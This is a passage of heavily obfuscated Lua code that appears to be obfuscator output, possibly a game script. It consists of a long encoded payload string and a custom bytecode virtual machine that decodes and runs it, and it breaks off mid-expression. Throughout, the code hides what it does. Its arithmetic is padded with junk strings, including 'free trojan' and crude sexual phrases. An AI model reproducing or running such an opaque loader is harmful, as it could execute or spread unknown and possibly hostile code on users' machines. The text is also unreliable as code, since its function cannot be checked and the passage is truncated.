ڪئسك؃ڪؠجضقڝټنحئڝڪآآدجسټؠق؃حضټزسڝدسؠكضڪ؃جنقئټڝحكقجآڪدقسئؠټ؃زضدنؠڝسئ؃كؠآضجڝقكټئحڪققآجدټسزؠح؃آؠسن؃ڝؠئضكئجنجئكڪټكججزڪ؃آسحسآؠز؃ضنؠنس؃؃ئنكضئڝجكقجټڪحقزحآټدققضڝآ؃سس؃نؠنضئڝككڪسجڪققټججټززټحدآزسؠححؠضضن؃دنئض؃ڪڪكججقڪڝقححزآڝزددټؠؠس؃؃ضؠآئڝڝئكټجڪڪنققحټټحززدآآدسز؃ؠؠئضضڝآكڝضئڪكقڪججټققحححآقسآددؠآضؠ؃؃نضئؠڪڝكئجكټڪقكحقآڪزحدنؠآسد؃سآؠټڝڝضكؠجڝڪضقكجحټجققجحآحسز؃آؠڝضسڝآن؃ئضدئقڝجئټكزڝحجآقسټدحؠزضآ؃دنسئټڝ؃كضجنقئقكحكآڪزجحټسؠؠئ؃نضضكسڝسكؠئ؃ڪضقنحڝټئزكجآآجسق؃ټآئقكڝآنجئسڪټك؃جضټنكدضسآكزددجؠنضټ؃حنزضڪحنكسجڝڪ؃قسحنآڝزئدڝجسسج؃ټنټضحڝزكټئدڪنقؠج؃حټزندڝآئسؠ؃ڪؠجضقڝټڝنئزڪآكدجسټؠق؃حضآنآزدئؠكضڪ؃سنقئټڝحكزكئڪدقسحؠټدزضدنؠڝسئئقنڪضزڝقكڝئحڪققآجزڝضزؠح؃آضقئ؃ڝؠضضكڝڝنجئآجحكحجزټآكؠحسآآز؃دؠټكضڝ؃ئنكسقڝجككجټڪجقزج؃دسزسدؠآ؃زڝ؃نؠ؃ضئڝڝحجئجڪكقټئحټززټحدآسسؠدئڝنضنڝڝنئضكڪڪكئجقڪدآزحزآآزدج؃ؠؠسد؃ضننؠؠڝئكټجڪڪضققج؃ټحززققآدسؠ؃ؠؠجضضڝآكڝئنسڪقڪجزټقكحححآقسآدسؠسضڝئضنضئنڪڝنكجكټڝقجحآدحزحدزؠآزؠ؃سنآض؃ڝض؃سجڝڪققكج؃ټجزؠدټآحټج؃آؠسضسڝڪن؃ئزڪنكضضجټكقححجڪحسټدجؠزسد؃دننك؃ڝ؃كضجنڝكقئحنآڪززضټؠټسح؃زآزضدڝزكؠئ؃ڝټقنججټئزكدڪآجسق؃ټؠجضز؃؃ندئزڪؠك؃جضټننزحئآټسڪدضؠقضټ؃حنززسڝدكسجؠڪدقضحنآڝزضدكؠڪسج؃قنټضحڝزنجئدڪسقؠج؃ټټزندڝآئسن؃ڪؠجضقڝټنحئزڪآكدجسټؠق؃حضآنسڝدئؠكضڪ؃جنقئټڝحكزجآڪدقسحؠټجزضدنؠڝسئ؃كنڪضجڝقكټئحڪزقآجدټسزؠح؃آضسآ؃ڝؠئضكڝڪنجئقڪټكحجقټآقدحسآؠز؃دضؠنضڝ؃سؠ؃ئڪڝجكقد؃ڪسقزحآټدقحآزدڪسدقدؠنضئڝككڪجقكڝټڝئحزكټدڪؠضكنئڝ؃جنقآ؃ضنئئكڪڪقؠڪسئ؃قحټئحجقآدټؠؠس؃؃ضكڝ؃سئسنكڪ؃جققئټحټنززدآآدضئآئدئس؃كقڝ؃ج؃زټآ؃جنټقزټححآڝحسز؃ؠؠڝټئسنحآدڝحكئجكټڪكسټقجضزڪدزؠآسددقحسض؃ڝضكنئئڪئقكحڪڝجزقدټآحسز؃آؠدضټڝؠؠحئضڪنك؃جئټآزڪحجآقسټدحؠزضڪ؃دنسئؠڝ؃كضجنټڝقئحكآڪزضدقؠڝسحدكنآضدڝزكؠئدڪضقنحڝڝئزكدڪآئسق؃ڪؠحضؠڝآآدئسڪؠكدجضټؠزڝحسآكقڪدجؠقضڪ؃حنقئآڝزكسجټحنقضحټآڝزئدكؠڪسج؃قجضضحڝقكآئئڪسقآج؃ټضنئدڝآئسك؃ڝؠجضقڝټنجئزڪآكدجآټؠق؃حضؠئززدئؠكضڪڝدسدؠحڝؠئجسسټڝدڪئسټضزضدنؠڝئآآ؃؃ڪضقكنڝټئڝڪزقآجدآڪحؠقجټح؃آسئك؃ڝآئحك؃آندؠسئنڪڪ؃قدحسآؠزآآددقضؠئټؠحئڪڝجكقجحككټكجآزجآؠڪؠسئنجكقؠضضئڝككڪجقكئڝ؃حڪقحټجحكآسسؠد؃آززضڝڝنضئكڝحكججقټټنححزآآزحدسؠآس؃؃قننسڝڝئككجڝڪجقكحټټجززجآآدسس؃آؠ؃ضسڝنندئئڪكقڪججټكزټحئآزسڪددټسضؠ؃؃نزئنڪڝكئجڪټڪكجحقآټزجدزآحسد؃قنؠض؃ڝضكنجڝڪئقنحڪټجزقدټآحسز؃آؠحضس؃جن؃ئضڪنج؃جئټكزڪحجآقسټقحڝزئئ؃دنسئؠڝ؃ڝضئسټڝقئحكآحدټئؠؠك؃ڝسدقڪآڝحضضقآحڝحقنحڝټئزكدڪآجسقڝټڝدحن؃؃ندئسڪؠكزڝكجڝزؠكؠآآسڪدجؠقزضآحڝن؃قڝضكسجؠڪ؃قټټټحدزټؠڪآئسج؃قنټسنؠسڝڝئدكدټضضدټضزندڝټسنح؃ڪؠسضق؃؃نحئزڪآكدآئټؠقجحضآټسڝدضؠكسئضننقض؃ڝحكڪجآڪحقسحؠټ؃زكضڝؠڝسئ؃كؠضضجڝككټضئح؃قآجئټسزڪح؃آضسن؃ڝئحضك؃دنجئؠڪټكججزټآنكحسآڪز؃دزؠنضڝ؃ئؠؠق؃ڝجكؠجټڪسقزحآټدقققټآ؃سك؃نؠدضئڝككڪضضڪققټجزټزق؃حدآسسؠد؃ؠضضن؃ضنئئكڪڪكججقڪڝقححزټجزددنؠؠس؃؃ضنڪئڝڝئكڪجڪ؃؃ققحڪټحززضآآدسڝ؃ؠؠئضضڝنكڝضسحڝقڪجټټققضححآزسآجدؠسضؠ؃ننضضئڪڝكؠجكڝڪقجحقټقزحدزؠآسز؃سنؠض؃ڝضنزجڝڪآقكحڪټجزقدټآحزض؃آؠكضسڝؠن؃ئضڪنقڝجڝټكقآحجآنسټجحؠزضآ؃آنسضسڝ؃كنجنټڝقئحكټكزجدنؠټسئ؃زنآضدڝسنسئ؃ڝ؃قنجحټئككدڪآجزج؃ټؠټضزڝټندئسڪؠك؃جڝټنقدحئآؠسڪدجؠقضټ؃سنزضضڝدن؃جؠڪ؃قضحنټقزئدآؠڪسض؃قآټضحڝزكڝئدڪڝقؠجدټضزڪسؠآئسڪ؃ڪآ؃ضقڝڪنحضكحضكدجؠټؠقجحضآنسڝدئحنضڪ؃قنقئڪڝحكؠجآڪدنڪحؠټئزضدآؠڝسئ؃كنڪزټڝقكټئحڪققآجدټسزؠح؃آضسندحټئضكڝڪنجكدڝؠكحجزټآزقټسحڝززآد؃ؠضؠكآڝئحڪقحآئدټسققؠجضټدزسدؠؠحددزجكن؃؃ئڪكقڪزححڪټجټټززآحدنآحنزضنټڝنئنكنټټجدقحقكآزقټحزآآزد؃نزقؠن؃دضضنسټڪجآزآآټدزڪكڪزززدآآدضټؠؠ؃حئڝنؠڪؠجآقسؠزدټسؠؠض؃ئجڝسنټڪدآسقؠټ؃دئؠآحنسجكټڪقجدټق؃ټآحدسحنزڝ؃ئسزضڪححنزسؠس؃ڪضؠكؠڪحجؠض؃سڝ؃آؠدضسڪټئآنڪآزجؠقكآضدحنڪآقحكدقؠزضآ؃دكؠڝزضجكدڪضجسؠححكآڪزجدقؠټسحز؃ڪآقج؃قكؠئ؃ڪضزآټؠجټضدآك؃ټسسنقڪقئئزجآټدڝسټنآڝټضجنجكؠآآسڪدجؠقز؃ؠح؃ڝ؃ق؃ئكسجؠڪ؃سؠڪضج؃ززآڝڪحس؃زنڪزجؠقآآقح؃ئقننټآجؠكقڪجآقزق؃ڪؠجضقڝحضڝندڝ؃حڝقؠټټڝ؃زحنڪ؃جحنكئټټجضؠڝئټڝحكزجآڪدقسحؠټ؃ټضحزؠڝسئ؃ككئ؃نضحكؠڪټدنقئټجدئسنننڝؠئضؠئؠڪضكڝڪنجحڪنآڝزحڝزآآآدآضڝؠج؃ئنئسك؃ئنكئڪټكضضكدڪدحټقضؠؠ؃زضآن؃ټآ؃ڝنڝضئڝكقسڝنئقكحټئئؠزټضجټضسؠد؃ؠضضدؠجڝآئكقڝټڝجضقضكآد؃ئڪكنڪڝججزټټقآحئڝڝئككحسنجڪآجقزڪآزڝضضقؠئڝكجنزڝآقدڪئټؠن؃حئڪقڪڪسججزجؠندجقكس؃؃؃نضئن؃زئڝقؠڪآحڪڝؠټضزحدزؠآئڝؠڝ؃ڝضؠكجڪؠحؠزقن؃حڪټجزقڪټئنحن؃آڝجڪئ؃جن؃ئضڪنقئڪڪجټزڪټئدئسضنڝسڝقكئئآحجسټحآؠضئدڪئ؃ج؃آڪزجدقؠقدحضؠؠزڝټئؠضزن؃ڝ؃قنحڝټئسؠآنحآضضنڝ؃دئڝقڪټڝجضقضكئئ؃ټنزڝحئنڝحټزقؠ؃ڝټئټكټڪ؃جئقضقټضزككحنآڝزئد؃سڪؠض؃حضڪكڪڪڝجكضآټ؃دڪضننزټحئسقئټ؃حضسكؠجدقؠحئزڪآكددآكحټنحجزضند؃ڝضدكقڪآجټزضټجدجسئنڪآقحؠټ؃زضحآڪڝسئ؃آنڪضكڝقكټئح؃زقآجدټكزؠحجآضزس؃ڝآسضكڝڪنزئق؃قكحجزټآكجحسآؠزضدضټضضڝ؃ئنكس؃ڝجكقئجڪحنححآټدزسحټآ؃سضددنڝسڝڝككڪئجڝنقټجحټڝزآجآآسسؠد؃ؠضضنڝڝنزئكڝسكججنټټكححزآآزددسټدس؃؃قننسدڝئككئدڪجن؃حټټحززجآآدسس؃ڪؠ؃ضقڝننؠئئڝؠقڪججټآزټججآزسآددؠسضؠ؃؃نقئنڝدكئجؠټڪكضحقآټزسدزټقسد؃سنؠز؃ڝضكنئجڪئقټحڪټڝزقحڝآحسزددؠدسضڝؠن؃ئضڝآقڝجئټڝزڪجحآقسټدحآكضآ؃دنټئؠڝڝكضجنټڝقئحكآڪززدقآئسح؃كنآسدڝسكؠئجڪضقڪحڝټقزكج؃آجسقددؠحزجڝآندئس؃ؠك؃جضټڪزڝحقآكزندجآنضټ؃حنآئآ؃؃كسجؠڪ؃كزحنآڝزندكآټسج؃قنټسئڝزكآئقڪسكنج؃ټضزندڝآئسكدحؠجضڝڝټنئئزڝآكدجسټڪق؃جڝآنزجدئڪكضڪ؃جنؠئټ؃ئكزض؃ڪدنسحؠټ؃زكدنآحسئدآنڪضجڝقكټئسڪزقڪجدټقزؠجحآضسندئؠئزدڝڪنجئق؃ټكحجزڪدقدحؠآؠزآدضآآضڝ؃ئنڝئڪ؃جكقجټڪحقزحآټدزټدؠآئسض؃ننڝضئڝككڪئقڪقكئجحټكزآضدآسسؠدضؠضسزڝڝؠقئكدڪكججقڪحقححڪآآقندسڪؠس؃؃ضنڝئڝددككضزڪجؠقحټټحزآدآڪ؃سسدجؠ؃قضڝنكڝئكڪكقڝججڪحزټححآزسآدزؠسضؠ؃؃نضئنڝڝكئجكڪجقججټآټزقدزآڪسد؃سؠدض؃؃ټكنجڝڪئنكحڪټجزڪدټآقسزدقؠدسقڝؠن؃ئآڪننڝجئټكزڪحجآقسټدنؠزس؃؃دنسئؠڝ؃كضجنڪضقئجدآڪزضدقڪټسح؃زؠحضد؃دكؠضكڪضؠنحڝټئزڝدڪآضسقحسؠحقزڝآندئآڪؠكڪجضڪحزڝضئآكسڪدكؠقسح؃حنڝئآحدكسجؠڪسقضحؠآڝزڪدكڪڪسج؃قؠجضح؃آكآئكڪسكؠج؃ټضزڝدڝڪحسكددؠجسقڝټنحئآڪآكئجسټڝق؃جضآنسڝدنؠكزآ؃جنؠئټ؃حكزجآڪزقسحڪټ؃زكدنآڝسئ؃كؠدضج؃دكټئجڪزكآجدټسزڝح؃آڪسن؃ڝؠئسؠڝڪنجئڝڪټنكجزټآقدحآئجز؃دټؠنضڝ؃ئننئڪڝسكقجټجنقزحآټدزقدؠآ؃سض؃نټئضئڝككڪئئڪققټجحټزټئحدآسسؠد؃ؠضضنڝڝنئققڪڪكنجقټڝقححقآآزدئ؃ؠؠس؃؃ضنؠئڝڝئككجڝڪجققحټټسززدآآدجك؃ڝؠ؃ضضڝنكؠڝ؃ئجككټقټڪزټححآزسدؠټدكضزنؠڝآټقڝزكئجكټڪزڪټقحنزقؠز؃قضڪنڪححضكڝضكنجڝټدجكق؃ټآحكسحؠ؃ڝزضضآنضسڝؠن؃ئضڝ؃قڝجئټكزڪحجآقسټدق؃ڪضآ؃دنسئڝڝ؃كسجنټڝقئحټدجزجدقؠټسس؃زنټضدڝنڪ؃ئ؃ڪضقنجئټئزندڪآجكح؃ټؠحضزڝټندئسڪؠك؃جؠټنزڝحئآنسڪدجؠقزټكدنزئآڝدكسجؠڪئقضئنڝټزئدكؠڪسج؃قنڪضحڝزڪنئدڪسقؠجحټضزآدڝآنؠح؃ڪؠجضق؃كنحئقڪآكحجسټڝآضحضآنسڝح؃ؠكضڝ؃جنآكحڝحكزجآڝكقسحآټ؃زضح؃ؠڝسئ؃كؠ؃ضجڝقكټئقجڪقآجدټسكجح؃آسسن؃ڝؠئضټئجنجئقڪټننجزټټقدحسټدز؃دضؠنسد؃ئنكئڪدجحزجټڪحقزحآټدزقدؠآسنڪ؃ننڝضئ؃ټكڪئئڪققڪجحټؠآدحدآسسؠحئؠضضؠڝڝنققڪڪڪكججقڝضقححقآآزددآؠؠس؃؃ضنآئڝڝئككجڪڪكققحڪټحززدآآدسسدؠآضضضڝنكڝئزڪكقڝججټآآحححآزسآدسؠسضآ؃؃نضزئڪڝكئجكټڝقجحقآټزحدزؠآسد؃سنڪضكڝضكنجڝؠزقآحڪټجزق؃ؠق؃ككحئؠدحك؃ضن؃ئضڪنززڪ؃جقضقآڝدزسحننڝ؃جآسدنؠئؠڝ؃كضئڝقؠټڪجحزڪضټدڝؠټسح؃زنئد؃ئآنحڪټحټززقڝټقزكدڪآجسئؠك؃آسحئضنكئسڪؠك؃دآقسڪجح؃ضسؠح؃ڪضؠزق؃قنزئآڝدقؠڪزئجقدټضحسنسحزؠڪسج؃قكك؃حضآززڪججآززآئدقضكندڝكئنكئټضضقڝټنحئزڝحكدجسټؠق؃حضآنسڝدند؃ضڪ؃جنقسڪڝحكقجآڪدقسحڝدضزضدنؠڝقض؃كنڝضجڝقنجئحڪزقآجدټسزؠح؃ڪضڝك؃ڝؠئضكڝڪنجض؃ڪټكقق؃ټآقدحسټجز؃دسؠنس؃؃ئنټكجڝجكقجټڪنقزحټټدزنس؃آ؃سض؃نټ؃ضئڝنكڪضضحدقټجحټزق؃حدآسسؠد؃حنضن؃؃نئئكڪڪكججقڝټقححزآټزددزؠؠسك؃ضننئڝڝئكنجڪڪضققحټټحززدآآدسس؃ؠؠ؃ضضڝآكڝئقڪكقڪججټقكزححآقسآدز؃ټضؠ؃ئنضسئڪڝكضجكټڪقجحآدحزحدزؠآزؠ؃سنآض؃دضحكجڝڪكقكجحټجق؃دټآقؠ؃؃آؠسضس؃ڝن؃ئسڪنك؃جئټټآجحجآقسټحسؠزضټ؃دننك؃ڝ؃كضجنڝكقئحنآڪكجئسؠټسز؃زؠ؃ضدڝزكؠضحدزقنجسټئق؃دڪآجسق؃ټحڝضز؃دندئټڪؠكحجضڪ؃ټسحئآڪسڪحټؠقضڪ؃حنزئآڝضټؠجؠڪ؃قضئئآڝزضدكڪڪآض؃قؠدضحڝنكآئجڪسكدزڝټضزندڝټحسك؃ڝؠجضنڝټنسقآڪآكدجسڪكق؃حسآنسڝدنؠكضڪ؃جنكئټڝحكزضآز؃قسحؠټ؃زضدنآئسئحكټآضجڝقكټئحڪزكحجدټسؠنح؃آضسنددؠئضنڝڪنزقټڪټكحجزټآقدحزآؠز؃جڝؠنضڝ؃ئننئڪڝجكقجټڪحقزحآټدزڪدؠآ؃سضټټؠجضئڝككڪحټندڝججسكجكزحدآسسؠڝنسڪآدڝڝضجكؠڪئحززؠآآ؃ئضنقكڪآئققټآڪدجسڪكنڝكئڪكسڪسجدزئؠق؃ضحجآدسس؃ؠنض؃قسئنكڪنحڝقنڪآټققدحنآزسآددكڝ؃ڝسئكټڪكجڪقحآآحزقټحقآټزحڝټزجؠڪ؃آضڝقسڪنحڪزكآڝضآئنټجزقدټؠزدنزسؠؠڝآئدكآؠكحټق؃ؠڪدحضننئڪڪجدقضټس؃ڪسئكزڝسئؠكجڪجحڪزدؠضؠقزؠدقؠټسحدڝضآؠس؃دئدكدټضحآجؠټئزكدڪټضټح؃ټؠحضز؃ئندئسڪؠك؃جضټنزڝحئآنسڪدضؠقزټ؃حنزئآڝدكسجؠڪجقضضنآڝزئدكؠڪسك؃قؠدضح؃ككآئدڪسقؠجقټضزندڝآئسك؃ڪؠجضقڝڪنحئكڪآؠدجسټؠق؃حضآنسڝدزؠكز؃؃جنقئڪڝحكقجآڪدقسئؠټ؃زضدؠؠڝسض؃كؠ؃ضجدقكټئحڪققآجحټسق؃ح؃ټضسن؃ڝؠئضك؃ضنجئكڪټكحجزټآقدحسآآز؃دضؠنضڝ؃ئنكئڪڝجكق");local s=(0x73+-24)local o=88 local l=n;local e={}e={[(35/0x23)]=function()local n,e,a,r=v(K,l,l+N);l=l+S;o=(o+(s*S))%i;return(((r+o-(s)+d*(S*M))%d)*((M*F)^M))+(((a+o-(s*M)+d*(M^N))%i)*(d*i))+(((e+o-(s*N)+F)%i)*d)+((n+o-(s*S)+F)%i);end,[(0x120/144)]=function(e,e,e)local e=v(K,l,l);l=l+h;o=(o+(s))%i;return((e+o-(s)+F)%d);end,[(74+-0x47)]=function()local n,e=v(K,l,l+M);o=(o+(s*M))%i;l=l+M;return(((e+o-(s)+d*(M*S))%d)*i)+((n+o-(s*M)+i*(M^N))%d);end,[(-0x3e+66)]=function(l,e,o)if o then local e=(l/M^(e-n))%M^((o-h)-(e-n)+h);return e-e%n;else local e=M^(e-h);return(l%(e+e)>=e)and n or j;end;end,[(0x23-30)]=function()local o=e[(-47+0x30)]();local a=e[(0x7d/125)]();local r=n;local l=(e[(308/0x4d)](a,h,T+S)*(M^(T*M)))+o;local o=e[(106-0x66)](a,21,31);local e=((-n)^e[(55+-0x33)](a,32));if(o==j)then if(l==I)then return e*j;else o=h;r=I;end;elseif(o==(d*(M^N))-h)then return(l==j)and(e*(h/I))or(e*(j/I));end;return J(e,o-((i*(S))-n))*(r+(l/(M^z)));end,[(0x72-(0x125-185))]=function(a,r,r)local r;if(not a)then a=e[(127+-0x7e)]();if(a==j)then return'';end;end;r=H(K,l,l+a-n);l=l+a;local e=''for l=h,#r do e=G(e,L((v(H(r,l,l))+o)%i))o=(o+s)%d end return e;end}local function j(...)return{...},y('#',...)end local function H()local x={};local r={};local o={};local a={x,r,nil,o};local l={}local c=(-#{(function()return#{('HoKmKP'):find("\75")}>0 and 1 or 0 end),'nil';'}';'nil';13}+95)local o={[((1736/(324-0xc8))+-#"me big peepee")]=(function(o)return not(#o==e[(((0xaf+-55)+-#[[This is working now]])-99)]())end),[(56+-0x38)]=(function(o)return e[(38+-0x21)]()end),[((121-0x67)+-#"187 ist die gang")]=(function(o)return e[((67-0x39)+-#'Bong')]()end),[(0x62-94)]=(function(o)local n=e[(0x8b-((760/0x5)+-#[[This is working now]]))]()local o=''local e=1 for l=1,#n do e=(e+c)%i o=G(o,L((v(n:sub(l,l))+e)%d))end return o end)};local d=e[((8769/0xed)-0x24)]()for n=1,d do local e=e[(-#"test"+(0x3e-56))]();local d;local e=o[e%((0x56-52)+-#"free trojan")];l[n]=e and e({});end;for a=1,e[((0x7e-112)+-#"amena jumping")]()do local o=e[(90/0x2d)]();if(e[(-#"test"+(944/0x76))](o,n,h)==I)then local i=e[(-21+0x19)](o,M,N);local d=e[((-0x25+60)+-#"I like gargling cum")](o,S,M+S);local o={e[(0x4f-76)](),e[(-0x71+116)](),nil,nil};local r={[((100-0x44)-32)]=function()o[b]=e[(30/0xa)]();o[P]=e[(-0x20+35)]();end,[(0x79/121)]=function()o[O]=e[(122+-0x79)]();end,[(-#"Bong"+(0x4c-70))]=function()o[b]=e[(-#"free trojan"+(0x564/115))]()-(M^T)end,[((0x3f-41)+-#[[I like gargling cum]])]=function()o[k]=e[((0x8d-97)/44)]()-(M^T)o[p]=e[(0x19-22)]();end};r[i]();if(e[(-#"test 123"+(0xa80/224))](d,h,n)==h)then o[B]=l[o[t]]end if(e[(0x34-48)](d,M,M)==n)then o[f]=l[o[f]]end if(e[(-#"test"+(138-0x82))](d,N,N)==h)then o[m]=l[o[D]]end x[a]=o;end end;for e=h,e[(72+-0x47)]()do r[e-h]=H();end;a[3]=e[(-34+0x24)]();return a;end;local function v(e,S,s)local d=e[M];local i=e[N];local o=e[n];return(function(...)local I=y('#',...)-h;local L={};local T={};local F={...};local j=j local l={};local e=n e*=-1 local N=e;local K=d;local d=o;local o=n;local i=i;for e=0,I do if(e>=i)then L[e-i]=F[e+h];else l[e]=F[e+n];end;end;local e=I-i+n local e;local i;while true do e=d[o];i=e[(0x2c/44)];a=(1661976)while(923/((85-0x3f)+-#'no thanks'))>=i do a-= a a=(407030)while i<=(7630/(0x46ae/83))do a-= a a=(162288)while(35+-0x12)>=i do a-= a a=(3204267)while i<=(616/(193-0x74))do a-= a a=(6182730)while i<=(627/(0x147+-118))do a-= a a=(934320)while i<=(0x77+-118)do a-= a a=(1735228)while i>(0x0/230)do a-= a l[e[r]]=(e[g]~=0);break end while(a)/(((0x47899d4/141)/0xd6))==698 do local i;local a;l[e[t]]=s[e[g]];o=o+n;e=d[o];l[e[r]]=l[e[f]][e[m]];o=o+n;e=d[o];l[e[B]]=e[k];o=o+n;e=d[o];l[e[B]]=S[e[O]];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[U]))o=o+n;e=d[o];l[e[w]]=l[e[k]][e[P]];o=o+n;e=d[o];l[e[x]]=l[e[U]][e[p]];o=o+n;e=d[o];a=e[B];i=l[e[b]];l[a+1]=i;l[a]=i[e[D]];o=o+n;e=d[o];l[e[x]]=e[f];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];l[e[r]]=l[e[f]][e[_]];o=o+n;e=d[o];a=e[r];i=l[e[g]];l[a+1]=i;l[a]=i[e[C]];o=o+n;e=d[o];l[e[r]]=e[b];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];l[e[t]]=l[e[O]][e[D]];o=o+n;e=d[o];a=e[c];i=l[e[O]];l[a+1]=i;l[a]=i[e[_]];o=o+n;e=d[o];l[e[B]]=e[k];o=o+n;e=d[o];a=e[w]l[a]=l[a](u(l,a+n,e[O]))o=o+n;e=d[o];l[e[r]]=l[e[U]][e[D]];o=o+n;e=d[o];a=e[w];i=l[e[b]];l[a+1]=i;l[a]=i[e[P]];o=o+n;e=d[o];l[e[t]]=e[b];o=o+n;e=d[o];a=e[B]l[a]=l[a](u(l,a+n,e[k]))o=o+n;e=d[o];l[e[x]]=l[e[g]][e[_]];o=o+n;e=d[o];a=e[x];i=l[e[k]];l[a+1]=i;l[a]=i[e[_]];o=o+n;e=d[o];l[e[c]]=e[b];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];l[e[x]][e[k]]=e[p];o=o+n;e=d[o];l[e[c]][e[U]]=e[_];o=o+n;e=d[o];l[e[w]][e[b]]=e[_];o=o+n;e=d[o];l[e[B]][e[O]]=e[C];o=o+n;e=d[o];l[e[r]][e[f]]=e[_];o=o+n;e=d[o];l[e[w]]=s[e[U]];o=o+n;e=d[o];l[e[r]]=e[g];o=o+n;e=d[o];a=e[x]l[a](l[a+h])o=o+n;e=d[o];l[e[w]]=s[e[f]];o=o+n;e=d[o];l[e[c]]=l[e[O]][e[D]];o=o+n;e=d[o];l[e[x]]=s[e[b]];o=o+n;e=d[o];l[e[w]]=l[e[U]][e[P]];break end;break;end while(a)/((0x3f8-558))==2040 do a=(2457155)while(88/0x2c)<i do a-= a local e=e[x]l[e]=l[e]()break end while 2515==(a)/(((0x1f20/8)+-#"This is working now"))do if(e[t]<l[e[_]])then o=e[g];else o=o+h;end;break end;break;end break;end while(a)/((325890/0x8e))==2694 do a=(10127040)while(-#"me big peepee"+(0x24/2))>=i do a-= a a=(197496)while(32/0x8)<i do a-= a local i;local a;l[e[t]]=s[e[b]];o=o+n;e=d[o];l[e[x]]=l[e[f]][e[_]];o=o+n;e=d[o];l[e[r]]=l[e[O]];o=o+n;e=d[o];a=e[B]l[a]=l[a](l[a+h])o=o+n;e=d[o];l[e[t]]();o=o+n;e=d[o];l[e[c]]=s[e[O]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];a=e[r]l[a](l[a+h])o=o+n;e=d[o];a=e[w];i=l[e[O]];l[a+1]=i;l[a]=i[e[m]];o=o+n;e=d[o];a=e[c]l[a](l[a+h])break end while 72==(a)/((0x158d-2774))do local a;l[e[c]]=e[g];o=o+n;e=d[o];l[e[w]]=e[f];o=o+n;e=d[o];a=e[B]l[a](u(l,a+h,e[f]))o=o+n;e=d[o];l[e[t]]=(e[U]~=0);o=o+n;e=d[o];l[e[t]]=s[e[f]];o=o+n;e=d[o];l[e[x]]=l[e[O]][e[_]];o=o+n;e=d[o];l[e[B]]=e[f];o=o+n;e=d[o];l[e[B]]=e[b];o=o+n;e=d[o];l[e[c]]=e[O];o=o+n;e=d[o];a=e[x]l[a]=l[a](u(l,a+n,e[k]))break end;break;end while(a)/((-#"test 123"+(-0x57+3109)))==3360 do a=(9165790)while(162/0x1b)>=i do a-= a l[e[w]]=S[e[k]];break;end while 3610==(a)/(((-0x7c+2667)+-#[[Bong]]))do a=(99461)while(((0x2455/71)+-#[[free trojan]])-0x71)<i do a-= a l[e[r]]=S[e[k]];o=o+n;e=d[o];l[e[x]]=#l[e[b]];o=o+n;e=d[o];S[e[g]]=l[e[B]];o=o+n;e=d[o];l[e[w]]=S[e[U]];o=o+n;e=d[o];l[e[c]]=#l[e[k]];o=o+n;e=d[o];S[e[f]]=l[e[r]];o=o+n;e=d[o];do return end;break end while 1259==(a)/((0x1c64/92))do local n=e[t];local d=l[n]local a=l[n+2];if(a>0)then if(d>l[n+1])then o=e[g];else l[n+3]=d;end elseif(d<l[n+1])then o=e[g];else l[n+3]=d;end break end;break;end break;end break;end break;end while 2937==(a)/((0x8d3-1168))do a=(4349280)while i<=((-25+0x29)+-#[[Bong]])do a-= a a=(337120)while i<=((-74+-0x5)+0x59)do a-= a a=(8448)while((0x49-45)+-#[[This is working now]])<i do a-= a l[e[c]]={};break end while(a)/((-#[[Bong]]+(0x81-103)))==384 do local o=e[r]local d,e=j(l[o](u(l,o+1,e[f])))N=e+o-1 local e=0;for o=o,N do e=e+n;l[o]=d[e];end;break end;break;end while(a)/(((-18+0x5d2)-784))==490 do a=(3196928)while(-#[[Bong]]+(48+-0x21))<i do a-= a local a;l[e[r]]=l[e[b]][e[m]];o=o+n;e=d[o];l[e[t]]=l[e[f]];o=o+n;e=d[o];l[e[r]]=l[e[b]];o=o+n;e=d[o];a=e[r]l[a](u(l,a+h,e[g]))o=o+n;e=d[o];l[e[c]]=s[e[O]];o=o+n;e=d[o];l[e[r]]=l[e[f]][e[_]];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];l[e[r]]=l[e[U]];o=o+n;e=d[o];a=e[c]l[a]=l[a](u(l,a+n,e[f]))o=o+n;e=d[o];l[e[x]][e[g]]=l[e[m]];break end while 896==(a)/((7156-0xe04))do local a;l[e[w]]=e[U];o=o+n;e=d[o];l[e[B]]=e[b];o=o+n;e=d[o];l[e[r]]=e[k];o=o+n;e=d[o];l[e[x]]=e[g];o=o+n;e=d[o];a=e[t]l[a]=l[a](u(l,a+n,e[g]))o=o+n;e=d[o];l[e[B]][e[k]]=l[e[D]];o=o+n;e=d[o];l[e[x]][e[U]]=e[p];o=o+n;e=d[o];l[e[B]]=s[e[b]];o=o+n;e=d[o];l[e[w]]=l[e[O]][e[P]];o=o+n;e=d[o];l[e[x]]=e[b];break end;break;end break;end while 1066==(a)/((-#[[test]]+(-80+0x1044)))do a=(9541182)while(150-0x88)>=i do a-= a a=(400320)while(-#"I like gargling cum"+(0x5f-63))<i do a-= a local a;l[e[r]]=l[e[U]][e[D]];o=o+n;e=d[o];l[e[r]][e[U]]=e[P];o=o+n;e=d[o];l[e[B]]=S[e[g]];o=o+n;e=d[o];l[e[r]]=l[e[b]][e[P]];o=o+n;e=d[o];l[e[c]][e[f]]=e[_];o=o+n;e=d[o];l[e[w]]=S[e[U]];o=o+n;e=d[o];l[e[B]]=S[e[b]];o=o+n;e=d[o];l[e[r]]=l[e[k]][e[C]];o=o+n;e=d[o];l[e[B]]=l[e[O]][e[_]];o=o+n;e=d[o];l[e[c]]=l[e[b]][e[_]];o=o+n;e=d[o];l[e[B]][e[k]]=l[e[m]];o=o+n;e=d[o];l[e[x]]=S[e[b]];o=o+n;e=d[o];l[e[r]]=s[e[U]];o=o+n;e=d[o];l[e[B]]=l[e[g]][e[C]];o=o+n;e=d[o];l[e[x]]=S[e[g]];o=o+n;e=d[o];l[e[B]]=S[e[k]];o=o+n;e=d[o];l[e[c]]=S[e[U]];o=o+n;e=d[o];a=e[r]l[a]=l[a](u(l,a+n,e[g]))o=o+n;e=d[o];l[e[r]][e[f]]=l[e[C]];o=o+n;e=d[o];l[e[c]]=S[e[O]];o=o+n;e=d[o];l[e[c]]=S[e[k]];o=o+n;e=d[o];l[e[r]][e[U]]=l[e[m]];o=o+n;e=d[o];o=e[U];break end while 192==(a)/((-#[[I like gargling 